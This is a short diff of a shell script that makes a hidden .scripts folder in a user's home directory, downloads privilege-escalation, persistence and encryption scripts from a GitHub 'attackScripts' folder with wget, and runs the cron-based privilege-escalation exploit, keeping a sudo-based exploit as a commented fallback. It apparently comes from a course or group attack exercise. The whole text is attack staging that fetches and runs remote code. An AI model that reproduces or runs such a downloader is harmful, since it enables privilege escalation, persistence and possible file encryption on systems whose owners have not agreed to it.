@@ -4,7 +4,8 @@ cd /home/resch
 mkdir .scripts
 cd /home/resch/.scripts
 #PE
-wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_PEexploit.sh
+wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_PEexploitCron.sh
+wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_PEexploitSudo.sh
 # Persistence
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_persistence1.sh
 wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/Gp5_persistence2.sh
@@ -27,6 +28,7 @@ wget https://raw.githubusercontent.com/S692/ossas/main/attackScripts/encryption/
 
 echo "Start of exploit...."
 echo "Running PE exploit for cronjob..."
-./Gp5_PEexploit.sh
+./Gp5_PEexploitCron.sh
 
-
+# if the PE did not work, run the other PE exploit ./Gp5_PEexploitSudo.sh
+#./Gp5_PEexploitSudo.sh
